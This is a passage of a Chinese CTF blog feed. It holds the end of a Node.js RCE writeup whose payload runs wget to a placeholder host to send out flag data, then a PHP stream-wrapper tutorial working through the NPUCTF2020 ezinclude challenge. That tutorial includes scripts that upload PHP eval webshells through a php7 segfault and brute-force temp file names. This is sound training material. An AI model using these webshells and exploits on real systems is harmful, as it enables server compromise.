class="string">&quot;./usage&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;exports&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;.&quot;</span><span class="punctuation">:</span> <span class="string">&quot;./preinstall.js&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;./&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;npm_config_global&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;npm_execpath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;--eval=require(&#x27;child_process&#x27;).execSync(&#x27;wget$&#123;IFS&#125;https://xxx/`/readflag`&#x27;)&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;x&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://ctf.zeyu2001.com/2022/balsnctf-2022/2linenodejs">https://ctf.zeyu2001.com/2022/balsnctf-2022/2linenodejs</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这题的出题人去年也出了0linephp和1linephp，用最短的题目搞最骚的操作。想了很多思路不得其解，根据赛后Writeup进行研究复现，主要是分析一下调试的过程。&lt;/p&gt;
&lt;h2 id=&quot;env&quot;&gt;&lt;a href=&quot;#env&quot; class=&quot;headerlink&quot; t</summary>
      
    
    
    
    <category term="writeup" scheme="https://lhhxs.github.io/categories/writeup/"/>
    
    
    <category term="CTF" scheme="https://lhhxs.github.io/tags/CTF/"/>
    
    <category term="RCE" scheme="https://lhhxs.github.io/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>PHP伪协议小总结</title>
    <link href="https://lhhxs.github.io/2022/09/09/WEB/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%B0%8F%E6%80%BB%E7%BB%93/"/>
    <id>https://lhhxs.github.io/2022/09/09/WEB/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%B0%8F%E6%80%BB%E7%BB%93/</id>
    <published>2022-09-09T12:34:23.046Z</published>
    <updated>2022-09-09T14:24:51.800Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PHP伪协议小总结"><a href="#PHP伪协议小总结" class="headerlink" title="PHP伪协议小总结"></a>PHP伪协议小总结</h1><h1 id="初步探索"><a href="#初步探索" class="headerlink" title="初步探索"></a><a href="#%E5%88%9D%E6%AD%A5%E6%8E%A2%E7%B4%A2" title="初步探索"></a>初步探索</h1><p>首先我们看到了一个界面</p><p><img src="https://hackerqwq.github.io/2020/04/27/php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%B0%8F%E6%80%BB%E7%BB%93/1.png"></p><p>只有一个链接到”.&#x2F;post&#x2F;index.php?file&#x3D;show.php”</p><p>点进去之后只显示test5</p><p><img src="https://hackerqwq.github.io/2020/04/27/php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%B0%8F%E6%80%BB%E7%BB%93/2.png"></p><p>查看源代码之后也找不到头绪<br>_SQL_注入也没用</p><h1 id="查找writeup"><a href="#查找writeup" class="headerlink" title="查找writeup"></a><a href="#%E6%9F%A5%E6%89%BEwriteup" title="查找writeup"></a>查找writeup</h1><p>结果：</p><p><img src="https://hackerqwq.github.io/2020/04/27/php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%B0%8F%E6%80%BB%E7%BB%93/3.png"></p><p>直接显示出网页源代码的_Base64_编码</p><p>拿去编码之后得出结果</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;Bugku-ctf&lt;/title&gt;</span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[file])&#123;<span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;./index.php?file=show.php&quot;&gt;click me? no&lt;/a&gt;&#x27;</span>;&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strstr</span>(<span class="variable">$file</span>,<span class="string">&quot;../&quot;</span>)||<span class="title function_ invoke__">stristr</span>(<span class="variable">$file</span>, <span class="string">&quot;tp&quot;</span>)||<span class="title function_ invoke__">stristr</span>(<span class="variable">$file</span>,<span class="string">&quot;input&quot;</span>)||<span class="title function_ invoke__">stristr</span>(<span class="variable">$file</span>,<span class="string">&quot;data&quot;</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Oh no!&quot;</span>;</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$file</span>); </span><br><span class="line"><span class="comment">//flag:flag&#123;edulcni_elif_lacol_si_siht&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h1 id="PHP伪协议知识"><a href="#PHP伪协议知识" class="headerlink" title="PHP伪协议知识"></a><a href="#PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%9F%A5%E8%AF%86" title="PHP伪协议知识"></a>PHP伪协议知识</h1><p><em>这道题用了PHP伪协议知识，PHP伪协议，实质上就是支持的协议与封装协议</em></p><p>支持的有_12_种</p><ul><li>file:&#x2F;&#x2F; — 访问本地文件系统</li><li>http:&#x2F;&#x2F; — 访问 HTTP(s) 网址</li><li>ftp:&#x2F;&#x2F; — 访问 FTP(s) URLs</li><li>php:&#x2F;&#x2F; — 访问各个输入&#x2F;输出流（I&#x2F;O streams）</li><li>zlib:&#x2F;&#x2F; — 压缩流</li><li>data:&#x2F;&#x2F; — 数据（RFC 2397）</li><li>glob:&#x2F;&#x2F; — 查找匹配的文件路径模式</li><li>phar:&#x2F;&#x2F; — PHP 归档</li><li>ssh2:&#x2F;&#x2F; — Secure Shell 2</li><li>rar:&#x2F;&#x2F; — RAR</li><li>ogg:&#x2F;&#x2F; — 音频流</li><li>expect:&#x2F;&#x2F; — 处理交互式的流</li></ul><p><em>首先说明一下inlude()函数，作用是引用外部文件比如说html,php等等，它对文件的后缀名没有要求而对文件内容有要求，只要是php的内容就会被执行_注意是执行而不是显示代码</em>_</p><h2 id="php-x2F-x2F-filter"><a href="#php-x2F-x2F-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a><a href="#php-filter" title="php://filter"></a>php:&#x2F;&#x2F;filter</h2><p>用法：</p><p><code>https://www.baidu.com?file=php://filter/...</code></p><p><img src="https://hackerqwq.github.io/2020/04/27/php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%B0%8F%E6%80%BB%E7%BB%93/4.png"></p><p>具体用法：<br><a href="https://www.baidu.com/?file=php://filter/read=convert.base64-encode/resource=./index.php">https://www.baidu.com?file=php://filter/read=convert.base64-encode/resource=./index.php</a><br><a href="https://www.baidu.com/?file=php://filter/read=string.rot13/resource=./index.php">https://www.baidu.com?file=php://filter/read=string.rot13/resource=./index.php</a></p><p>第一条是读取当前目录下的index.php文件并且以base64编码，浏览器就不会把PHP代码执行了<br>第二条跟第一条的区别是把编码方式变成了rot13，但是这种编码方式不会编码&lt;?并且使得内容乱码</p><p><img src="https://hackerqwq.github.io/2020/04/27/php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%B0%8F%E6%80%BB%E7%BB%93/5.png"><br>更多过滤器：</p><ul><li><p>字符串过滤器</p><blockquote><p>string.rot13<br>string.toupper<br>string.tolower<br>string.strip_tags(过滤标签)</p></blockquote></li><li><p>转换过滤器</p><blockquote><p>convert.base64-encode<br>convert.base64-decode</p><p>convert.iconv.utf-8.utf-16be，将utf-8转换为utf-16be</p><p>convert.quoted-printable-encode， 打印所有不可见字符</p><p>convert.unquoted-printable-encode，打印所有可见字符</p><p>convert.iconv.utf-16be.utf-8 ，将utf-16转为utf-8</p></blockquote></li><li><p>压缩过滤器</p><blockquote><p>zlib.deflate(压缩)<br>zlib.inflate(解压)<br>bzip2.compress &amp; bzip2.decompress(在本地文件系统中创建 bz2 兼容文件的方法)</p></blockquote></li><li><p>加密过滤器</p><blockquote><p>mcrypt.tripledes<br>mdecrypt.tripledes<br>多个过滤器用<code>|</code>隔开</p></blockquote></li></ul><h3 id="php7-segment-fault特性"><a href="#php7-segment-fault特性" class="headerlink" title="php7 segment fault特性"></a><a href="#php7-segment-fault%E7%89%B9%E6%80%A7" title="php7 segment fault特性"></a>php7 segment fault特性</h3><p>php:&#x2F;&#x2F;filter&#x2F;string.strip_tags&#x3D;&#x2F;etc&#x2F;passwd<br>php执行过程中出现 Segment Fault，这样如果在此同时上传文件，那么临时文件就会被保存在&#x2F;tmp目录，不会被删除</p><p>例题：<a href="https://buuoj.cn/challenges#[NPUCTF2020]ezinclude">https://buuoj.cn/challenges#[NPUCTF2020]ezinclude</a></p><p>打开网页，查看源代码，发现注释提示：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">md5</span>(<span class="variable">$secret</span>.<span class="variable">$name</span>)===<span class="variable">$pass</span> </span><br></pre></td></tr></table></figure><p>输入url：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?name=1 </span><br></pre></td></tr></table></figure><p>变化name的值，发现cookies的hash值在不断变化，说明hash值跟name的取值有关，但又不完全是name直接的md5取值，说明应该是加了盐的。根据提示md5( s e c r e t . secret. secret.name)&#x3D;&#x3D;&#x3D; p a s s ， 我 们 的 h a s h 值 很 有 可 能 是 m d 5 ( pass，我们的hash值很有可能是md5( pass，我们的hash值很有可能是md5(secret.$name)，如果参数pass传入cookies里面的hash值，可能就会成功。</p><p>输入url：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?pass=576322dd496b99d07b5b0f7fa7934a25&amp;name=1 </span><br></pre></td></tr></table></figure><p>发现响应为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;javascript&quot;</span> type=<span class="string">&quot;text/javascript&quot;</span>&gt; window.location.href=<span class="string">&quot;flflflflag.php&quot;</span>; &lt;/script&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;!--<span class="title function_ invoke__">md5</span>(<span class="variable">$secret</span>.<span class="variable">$name</span>)===<span class="variable">$pass</span> --&gt;</span><br><span class="line">&lt;/html&gt; </span><br></pre></td></tr></table></figure><p>尝试访问flflflflag.php：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/flflflflag.php </span><br></pre></td></tr></table></figure><p>响应为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;script language=<span class="string">&quot;javascript&quot;</span> type=<span class="string">&quot;text/javascript&quot;</span>&gt; window.location.href=<span class="string">&quot;404.html&quot;</span>; &lt;/script&gt;</span><br><span class="line">&lt;title&gt;this_is_not_fl4g_and_出题人_wants_girlfriend&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>])&lt;/body&gt;</span><br><span class="line">&lt;/html&gt; </span><br></pre></td></tr></table></figure><p>发现文件包含，猜测可能是文件包含漏洞，可以查看源码，输入url：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/flflflflag.php?file=php:<span class="comment">//filter/read=convert.base64-encode/resource=flflflflag.php </span></span><br></pre></td></tr></table></figure><p>用BurpSuite拦截响应，base64解码后得到源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;script language=<span class="string">&quot;javascript&quot;</span> type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">           window.location.href=<span class="string">&quot;404.html&quot;</span>;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;this_is_not_fl4g_and_出题人_wants_girlfriend&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/data|input|zip/is&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;nonono&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;include($_GET[&quot;file&quot;])&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt; </span><br></pre></td></tr></table></figure><p>利用目录扫描：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dirsearch.py -u http://b75582fa-5dab-4f76-8734-1c591cb88d31.node4.buuoj.cn:81/ -e * --<span class="built_in">timeout</span>=2 -t 1 -x 400,403,404,500,503,429 -w db/dict_mode_dict.txt </span><br></pre></td></tr></table></figure><p>字典链接：</p><p><a href="https://github.com/H4ckForJob/dirmap/blob/master/data/dict_mode_dict.txt">dirmap&#x2F;dict_mode_dict.txt at master · H4ckForJob&#x2F;dirmap</a></p><p>扫描结果：dir.php，可以查看源码，输入url：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/flflflflag.php?file=php:<span class="comment">//filter/read=convert.base64-encode/resource=dir.php </span></span><br></pre></td></tr></table></figure><p>用Burpsuite拦截响应，base64解码后源代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;/tmp&#x27;</span>));</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>dir.php能打印临时文件夹里的内容，因此我们要想办法把文件存到tmp文件夹中。</p><h4 id="方法一-利用php7-segment-fault特性（CVE-2018-14884）"><a href="#方法一-利用php7-segment-fault特性（CVE-2018-14884）" class="headerlink" title="方法一 利用php7 segment fault特性（CVE-2018-14884）"></a>方法一 利用php7 segment fault特性（CVE-2018-14884）</h4><p>php代码中使用php:&#x2F;&#x2F;filter的 strip_tags 过滤器, 可以让 php 执行的时候直接出现 Segment Fault , 这样 php 的垃圾回收机制就不会在继续执行 , 导致 POST 的文件会保存在系统的缓存目录下不会被清除而不像phpinfo那样上传的文件很快就会被删除，这样的情况下我们只需要知道其文件名就可以包含我们的恶意代码。</p><p>使用php:&#x2F;&#x2F;filter&#x2F;string.strip_tags导致php崩溃清空堆栈重启，如果在同时上传了一个文件，那么这个tmp file就会一直留在tmp目录，知道文件名就可以getshell。这个崩溃原因是存在一处空指针引用。向PHP发送含有文件区块的数据包时，让PHP异常崩溃退出，POST的临时文件就会被保留，临时文件会被保存在upload_tmp_dir所指定的目录下，默认为tmp文件夹。</p><p>该方法仅适用于以下php7版本，php5并不存在该崩溃。</p><p>利用条件：</p><ul><li>php7.0.0-7.1.2可以利用， 7.1.2x版本的已被修复</li><li>php7.1.3-7.2.1可以利用， 7.2.1x版本的已被修复</li><li>php7.2.2-7.2.8可以利用， 7.2.9一直到7.3到现在的版本已被修复</li><li>可以获取文件名</li><li>源代码将GET参数进行文件包含</li></ul><p>References</p><p><a href="https://www.shawroot.cc/1159.html">[NPUCTF2020]ezinclude（PHP临时文件包含） - 「配枪朱丽叶。」</a></p><p><a href="https://www.codenong.com/cs106498971/">PHP LFI 利用临时文件 Getshell 姿势</a></p><p>可以利用url：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/flflflflag.php?file=php:<span class="comment">//filter/string.strip_tags/resource=/etc/passwd </span></span><br></pre></td></tr></table></figure><p>现在开始利用上面的url，编写python脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO <span class="comment">#BytesIO实现了在内存中读写bytes</span></span><br><span class="line">payload = <span class="string">&quot;&lt;?php eval($_POST[cmd]);?&gt;&quot;</span></span><br><span class="line">data=&#123;<span class="string">&#x27;file&#x27;</span>: BytesIO(payload.encode())&#125;</span><br><span class="line">url=<span class="string">&quot;http://b75582fa-5dab-4f76-8734-1c591cb88d31.node4.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&quot;</span></span><br><span class="line">r=requests.post(url=url,files=data,allow_redirects=<span class="literal">False</span>) </span><br></pre></td></tr></table></figure><p>运行脚本后访问&#x2F;dir.php，得到tmp目录下刚刚我们上传的文件路径：&#x2F;tmp&#x2F;phpaRaCPM</p><p>利用BurpSuite发送请求：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /flflflflag.php?file=/tmp/phpaRaCPM HTTP/<span class="number">1.1</span></span><br><span class="line">Host: b75582fa-<span class="number">5</span>dab-<span class="number">4</span>f76-<span class="number">8734</span>-<span class="number">1</span>c591cb88d31.node4.buuoj.cn:<span class="number">81</span></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: <span class="number">14</span></span><br><span class="line"></span><br><span class="line">cmd=<span class="title function_ invoke__">phpinfo</span>(); </span><br></pre></td></tr></table></figure><p>在响应里得到flag，藏在phpinfo()里。</p><p>也可以修改脚本，直接通过上传的文件名访问phpinfo()：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line">file_data=&#123;</span><br><span class="line"><span class="string">&#x27;file&#x27;</span>: BytesIO(<span class="string">&quot;&lt;?php eval($_POST[cmd]);&quot;</span>.encode())</span><br><span class="line">&#125;</span><br><span class="line">url=<span class="string">&quot;http://d25d00be-1f7f-4fe4-872c-c951e304b522.node3.buuoj.cn/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&quot;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">r=requests.post(url=url,files=file_data,allow_redirects=<span class="literal">False</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>运行脚本后访问&#x2F;dir.php，得到tmp目录下刚刚我们上传的文件路径：&#x2F;tmp&#x2F;phppvB8A6</p><p>发送请求：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /flflflflag.php?file=/tmp/phppvB8A6 HTTP/<span class="number">1.1</span></span><br><span class="line">Host: b75582fa-<span class="number">5</span>dab-<span class="number">4</span>f76-<span class="number">8734</span>-<span class="number">1</span>c591cb88d31.node4.buuoj.cn:<span class="number">81</span> </span><br><span class="line"></span><br><span class="line">cmd=<span class="title function_ invoke__">phpinfo</span>();</span><br></pre></td></tr></table></figure><p>在响应里得到flag，藏在phpinfo()里。</p><p>在ctf中可能会给出dir.php，为了避免进行爆破文件名，但是在实际的渗透测试中，大部分是没法知道临时文件名的，此时就需要爆破。<br>例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line">charset = string.digits + string.letters</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;192.168.43.155&quot;</span></span><br><span class="line">port = <span class="number">80</span></span><br><span class="line">base_url = <span class="string">&quot;http://%s:%d&quot;</span> % (host, port)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file_to_include</span>(<span class="params">url, file_content</span>):</span><br><span class="line">    files = &#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;evil.jpg&#x27;</span>, file_content, <span class="string">&#x27;image/jpeg&#x27;</span>)&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.post(url, files=files)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span> e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_tmp_files</span>():</span><br><span class="line">    webshell_content = <span class="string">&#x27;&lt;?php eval($_REQUEST[c]);?&gt;&#x27;</span>.encode(</span><br><span class="line">        <span class="string">&quot;base64&quot;</span>).strip()</span><br><span class="line">    file_content = <span class="string">&#x27;&lt;?php if(file_put_contents(&quot;/tmp/ssh_session_HD89q2&quot;, base64_decode(&quot;%s&quot;)))&#123;echo &quot;flag&quot;;&#125;?&gt;&#x27;</span> % (</span><br><span class="line">        webshell_content)</span><br><span class="line">    phpinfo_url = <span class="string">&quot;%s/include.php?f=php://filter/string.strip_tags/resource=/etc/passwd&quot;</span> % (</span><br><span class="line">        base_url)</span><br><span class="line">    length = <span class="number">6</span></span><br><span class="line">    times = <span class="built_in">len</span>(charset) ** (length / <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(times):</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;[+] %d / %d&quot;</span> % (i, times)</span><br><span class="line">        upload_file_to_include(phpinfo_url, file_content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    generate_tmp_files()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>爆破temp文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">charset = string.digits + string.letters</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;192.168.43.155&quot;</span></span><br><span class="line">port = <span class="number">80</span></span><br><span class="line">base_url = <span class="string">&quot;http://%s:%d&quot;</span> % (host, port)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute_force_tmp_files</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> charset:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> charset:</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> charset:</span><br><span class="line">                <span class="keyword">for</span> l <span class="keyword">in</span> charset:</span><br><span class="line">                    <span class="keyword">for</span> m <span class="keyword">in</span> charset:</span><br><span class="line">                        <span class="keyword">for</span> n <span class="keyword">in</span> charset:</span><br><span class="line">                            filename = i + j + k + l + m + n</span><br><span class="line">                            url = <span class="string">&quot;%s/include.php?f=/tmp/php%s&quot;</span> % (</span><br><span class="line">                                base_url, filename)</span><br><span class="line">                            <span class="built_in">print</span> url</span><br><span class="line">                            <span class="keyword">try</span>:</span><br><span class="line">                                response = requests.get(url)</span><br><span class="line">                                <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> response.content:</span><br><span class="line">                                    <span class="built_in">print</span> <span class="string">&quot;[+] Include success!&quot;</span></span><br><span class="line">                                    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">                            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                                <span class="built_in">print</span> e</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    brute_force_tmp_files()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h4 id="方法二-利用-session-upload-progress-进行-session-文件包含"><a href="#方法二-利用-session-upload-progress-进行-session-文件包含" class="headerlink" title="方法二 利用 session.upload_progress 进行 session 文件包含"></a>方法二 利用 session.upload_progress 进行 session 